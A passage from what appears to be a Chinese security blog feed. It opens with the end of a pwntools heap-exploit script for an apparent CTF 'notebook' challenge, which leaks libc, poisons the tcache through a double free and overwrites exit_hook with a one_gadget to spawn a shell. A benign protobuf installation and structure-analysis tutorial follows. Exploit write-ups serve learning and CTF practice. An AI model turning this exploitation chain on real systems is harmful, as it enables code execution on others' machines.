class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0x40040000</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) :<br>  add(i , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>) :<br>  free(i)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>key = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lss(<span class="hljs-string">&quot;key&quot;</span>)<br><br>show(<span class="hljs-number">539034</span>) //远程   本地和这个不一样，也是看的大佬的偏移<br>main_arena = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arena - <span class="hljs-number">0x218c60</span><br>exit_hook = libc_base + <span class="hljs-number">0x00000000021A6C0</span><br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>) :<br>  add(<span class="hljs-number">9</span> , <span class="hljs-string">b&#x27;b&#x27;</span>)<br><br>fake_fd = key ^ exit_hook<br>add(<span class="hljs-number">10</span> , p64(fake_fd))<br>add(<span class="hljs-number">11</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">12</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>one_gadget = [<span class="hljs-number">0xeeccc</span>,<span class="hljs-number">0xeeccf</span>,<span class="hljs-number">0xeecd2</span>]<br>execve = libc_base + one_gadget[<span class="hljs-number">0</span>]<br><br>add(<span class="hljs-number">13</span> , <span class="hljs-number">2</span> * p64(execve))<br>p.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;main_arena&quot;</span>)<br>lss(<span class="hljs-string">&quot;exit_hook&quot;</span>)<br><br>p.interactive()<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exit_hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈protobuf</title>
    <link href="/2024/12/10/%E6%B5%85%E8%B0%88protobuf/"/>
    <url>/2024/12/10/%E6%B5%85%E8%B0%88protobuf/</url>
    
    <content type="html"><![CDATA[<h1 id="浅谈protobuf"><a href="#浅谈protobuf" class="headerlink" title="浅谈protobuf"></a>浅谈protobuf</h1><h2 id="protobuf在linux下的安装"><a href="#protobuf在linux下的安装" class="headerlink" title="protobuf在linux下的安装"></a>protobuf在linux下的安装</h2><h3 id="安装protobuf"><a href="#安装protobuf" class="headerlink" title="安装protobuf"></a>安装protobuf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/protocolbuffers/protobuf/releases/v3.6.1/protobuf-cpp-3.6.1.tar.gz<br>tar -xvzf protobuf-cpp-3.6.1.tar.gz<br>./configure<br>make<br><span class="hljs-built_in">sudo</span> make install<br><span class="hljs-built_in">sudo</span> ldconfig<br>protoc --version<br><br><span class="hljs-comment">##查看protoc在/usr/local/bin/动态链接是否正确</span><br><span class="hljs-comment">## ❯ ldd protoc</span><br>linux-vdso.so.1 (0x00007ffc3b5ce000)<br>libprotoc.so.17 =&gt; /usr/local/lib/libprotoc.so.17 (0x00007f835e800000)<br>libstdc++.so.6 =&gt; /lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f835e400000)<br>libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f835eb52000)<br>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f835e000000)<br>libprotobuf.so.17 =&gt; /usr/local/lib/libprotobuf.so.17 (0x00007f835dc00000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f835eb8a000)<br>libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f835ea69000)<br>libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007f835e7e4000)<br></code></pre></td></tr></table></figure><h3 id="安装C编译插件"><a href="#安装C编译插件" class="headerlink" title="安装C编译插件"></a>安装C编译插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/protobuf-c/protobuf-c<br>tar -xzvf protobuf-c.tar.gz<br><span class="hljs-built_in">cd</span> protobuf-c<br>./configure &amp;&amp; make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure><h2 id="protobuf结构体解析"><a href="#protobuf结构体解析" class="headerlink" title="protobuf结构体解析"></a>protobuf结构体解析</h2><p>示例：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br>package p0ach1l<span class="hljs-comment">;</span><br>message devicemsg &#123;<br>  required sint64 actionid <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  required sint64 msgidx <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  required sint64 msgsize <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  required bytes msgcontent <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">protoc <span class="hljs-params">--c_out=</span><span class="hljs-string">./</span> p0ach1l.proto <span class="hljs-comment">##C</span><br>protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> p0ach1l.proto  <span class="hljs-comment">##python</span><br></code></pre></td></tr></table></figure><p>c语言生成两个文件(.c和.h)</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101131658.png" alt="image-20241210113134556"></p><p>python生成一个py文件</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101132324.png" alt="image-20241210113228260"></p><p>下面来分析c语言下编译的文件</p><h3 id="函数操作"><a href="#函数操作" class="headerlink" title="函数操作"></a>函数操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span><br><span class="hljs-comment">/* Generated from: p0ach1l.proto */</span><br><br><span class="hljs-comment">/* Do not generate deprecated warnings for self */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;p0ach1l.pb-c.h&quot;</span></span><br><span class="hljs-type">void</span>   p0ach1l__devicemsg__init  <span class="hljs-comment">/*初始化 P0ach1l__Devicemsg 消息结构。该函数将一个静态的初始化值*/</span><br>                     (P0ach1l__Devicemsg         *message)<br>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-type">const</span> P0ach1l__Devicemsg init_value = P0ACH1L__DEVICEMSG__INIT;<br>  *message = init_value;<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__get_packed_size<span class="hljs-comment">/*返回 P0ach1l__Devicemsg 消息在序列化（打包）后的字节大小*/</span><br>                     (<span class="hljs-type">const</span> P0ach1l__Devicemsg *message)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_get_packed_size ((<span class="hljs-type">const</span> ProtobufCMessage*)(message));<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__pack<span class="hljs-comment">/*将 P0ach1l__Devicemsg 消息打包成二进制格式，输出到 out 指向的缓冲区。*/</span><br>                     (<span class="hljs-type">const</span> P0ach1l__Devicemsg *message,<br>                      <span class="hljs-type">uint8_t</span>       *out)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_pack ((<span class="hljs-type">const</span> ProtobufCMessage*)message, out);<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__pack_to_buffer<span class="hljs-comment">/*与 p0ach1l__devicemsg__pack 类似，不过是将消息打包到一个 ProtobufCBuffer 类型的缓冲区，而不是直接到 uint8_t* 数组中。*/</span><br>                     (<span class="hljs-type">const</span> P0ach1l__Devicemsg *message,<br>                      ProtobufCBuffer *buffer)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="hljs-type">const</span> ProtobufCMessage*)message, buffer);<br>&#125;<br>P0ach1l__Devicemsg *<br>       <span class="hljs-title function_">p0ach1l__devicemsg__unpack</span><br>                     <span class="hljs-params">(ProtobufCAllocator  *allocator,</span><br><span class="hljs-params">                      <span class="hljs-type">size_t</span>               len,</span><br><span class="hljs-params">                      <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>       *data)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (P0ach1l__Devicemsg *)<br>     protobuf_c_message_unpack (&amp;p0ach1l__devicemsg__descriptor,<br>                                allocator, len, data);<br>&#125;<br><span class="hljs-type">void</span>   p0ach1l__devicemsg__free_unpacked<span class="hljs-comment">/*从二进制数据中解包出 P0ach1l__Devicemsg 消息结构。*/</span><br>                     (P0ach1l__Devicemsg *message,<br>                      ProtobufCAllocator *allocator)<br>&#123;<br>  <span class="hljs-keyword">if</span>(!message)<br>    <span class="hljs-keyword">return</span>;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="P0ach1l-Devicemsg结构体"><a href="#P0ach1l-Devicemsg结构体" class="headerlink" title="P0ach1l__Devicemsg结构体"></a>P0ach1l__Devicemsg结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">P0ach1l__Devicemsg</span></span><br><span class="hljs-class">&#123;</span><br>  ProtobufCMessage base;<br>  <span class="hljs-type">int64_t</span> actionid;<br>  <span class="hljs-type">int64_t</span> msgidx;<br>  <span class="hljs-type">int64_t</span> msgsize;<br>  ProtobufCBinaryData msgcontent;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCMessage结构体"><a href="#ProtobufCMessage结构体" class="headerlink" title="ProtobufCMessage结构体"></a>ProtobufCMessage结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessage</span> &#123;</span><br><span class="hljs-comment">/** The descriptor for this message type. */</span><br><span class="hljs-type">const</span> ProtobufCMessageDescriptor*descriptor;<br><span class="hljs-comment">/** The number of elements in `unknown_fields`. */</span><br><span class="hljs-type">unsigned</span>n_unknown_fields;<br><span class="hljs-comment">/** The fields that weren&#x27;t recognized by the parser. */</span><br>ProtobufCMessageUnknownField*unknown_fields;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCFieldDescriptor结构体"><a href="#ProtobufCFieldDescriptor结构体" class="headerlink" title="ProtobufCFieldDescriptor结构体"></a>ProtobufCFieldDescriptor结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCFieldDescriptor p0ach1l__devicemsg__field_descriptors[<span class="hljs-number">4</span>] =<br>&#123;<br>  &#123;<br>    <span class="hljs-string">&quot;actionid&quot;</span>,<br>    <span class="hljs-number">1</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, actionid),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgidx&quot;</span>,<br>    <span class="hljs-number">2</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgidx),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgsize&quot;</span>,<br>    <span class="hljs-number">3</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgsize),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgcontent&quot;</span>,<br>    <span class="hljs-number">4</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_BYTES,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgcontent),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>查看结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCFieldDescriptor</span> &#123;</span><br>    <span class="hljs-comment">/** 字段在 .proto 文件中指定的名称 */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>        *name;<br><br>    <span class="hljs-comment">/** 字段在 .proto 文件中指定的标签值 */</span><br>    <span class="hljs-type">uint32_t</span>          id;<br><br>    <span class="hljs-comment">/** 字段的类型，`REQUIRED`（必需），`OPTIONAL`（可选），`REPEATED`（重复） */</span><br>    ProtobufCLabel    label;<br><br>    <span class="hljs-comment">/** 字段的类型 */</span><br>    ProtobufCType     type;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 字段在 C 结构体中的量化字段偏移量（例如 `has_MEMBER` 字段用于可选字段，或者 `n_MEMBER` 字段用于重复字段，或者 `case` 枚举用于 oneof 字段）。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span>          quantifier_offset;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 字段在 C 结构体中的成员偏移量</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span>          offset;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 类型特定的描述符。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 如果 `type` 是 `PROTOBUF_C_TYPE_ENUM`，则 `descriptor` 指向相应的 `ProtobufCEnumDescriptor`。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 如果 `type` 是 `PROTOBUF_C_TYPE_MESSAGE`，则 `descriptor` 指向相应的 `ProtobufCMessageDescriptor`。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 否则该字段为 NULL。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">void</span>        *descriptor; <span class="hljs-comment">/* 对于消息和枚举类型 */</span><br><br>    <span class="hljs-comment">/** 如果定义了默认值，则为该字段的默认值。可以为 NULL。 */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">void</span>        *default_value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 标志位字。可以设置零个或多个在 `ProtobufCFieldFlag` 枚举中定义的位。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span>          flags;<br><br>    <span class="hljs-comment">/** 为未来用途保留的字段 */</span><br>    <span class="hljs-type">unsigned</span>          reserved_flags;<br><br>    <span class="hljs-comment">/** 为未来用途保留的字段 */</span><br>    <span class="hljs-type">void</span>              *reserved2;<br><br>    <span class="hljs-comment">/** 为未来用途保留的字段 */</span><br>    <span class="hljs-type">void</span>              *reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCBinaryData"><a href="#ProtobufCBinaryData" class="headerlink" title="ProtobufCBinaryData"></a>ProtobufCBinaryData</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCBinaryData</span> &#123;</span><br><span class="hljs-type">size_t</span>len;        <span class="hljs-comment">/**&lt; Number of bytes in the `data` field. */</span><br><span class="hljs-type">uint8_t</span>*data;      <span class="hljs-comment">/**&lt; Data bytes. */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>编译信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> ProtobufCMessageDescriptor p0ach1l__devicemsg__descriptor =<br>&#123;<br>  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,<br>  <span class="hljs-string">&quot;p0ach1l.devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;Devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;P0ach1l__Devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;p0ach1l&quot;</span>,<br>  <span class="hljs-keyword">sizeof</span>(P0ach1l__Devicemsg),<br>  <span class="hljs-number">4</span>,<br>  p0ach1l__devicemsg__field_descriptors,<br>  p0ach1l__devicemsg__field_indices_by_name,<br>  <span class="hljs-number">1</span>,  p0ach1l__devicemsg__number_ranges,<br>  (ProtobufCMessageInit) p0ach1l__devicemsg__init,<br>  <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved[123] */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCMessageDescriptor结构体"><a href="#ProtobufCMessageDescriptor结构体" class="headerlink" title="ProtobufCMessageDescriptor结构体"></a>ProtobufCMessageDescriptor结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessageDescriptor</span> &#123;</span><br><span class="hljs-comment">/** Magic value checked to ensure that the API is used correctly. */</span><br><span class="hljs-type">uint32_t</span>magic;<br><br><span class="hljs-comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*short_name;<br><span class="hljs-comment">/** Identifier used in generated C code. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*c_name;<br><span class="hljs-comment">/** The dot-separated namespace. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*package_name;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Size in bytes of the C structure representing an instance of this</span><br><span class="hljs-comment"> * type of message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">size_t</span>sizeof_message;<br><br><span class="hljs-comment">/** Number of elements in `fields`. */</span> <span class="hljs-comment">//整个消息中 元素数个数</span><br><span class="hljs-type">unsigned</span>n_fields;<br><span class="hljs-comment">/** Field descriptors, sorted by tag number. */</span> <span class="hljs-comment">//字段描述符，按标签编号排序，指向第一个字段</span><br><span class="hljs-type">const</span> ProtobufCFieldDescriptor*fields;<br><span class="hljs-comment">/** Used for looking up fields by name. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span>*fields_sorted_by_name;<br><br><span class="hljs-comment">/** Number of elements in `field_ranges`. */</span><br><span class="hljs-type">unsigned</span>n_field_ranges;<br><span class="hljs-comment">/** Used for looking up fields by id. */</span><br><span class="hljs-type">const</span> ProtobufCIntRange*field_ranges;<br><br><span class="hljs-comment">/** Message initialisation function. */</span><br>ProtobufCMessageInitmessage_init;<br><br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved1;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved2;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数据类型-字段的性质"><a href="#数据类型-字段的性质" class="headerlink" title="数据类型&amp;&amp;字段的性质"></a>数据类型&amp;&amp;字段的性质</h3><p>ProtobufCType 结构体(type) 指定了字段的类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 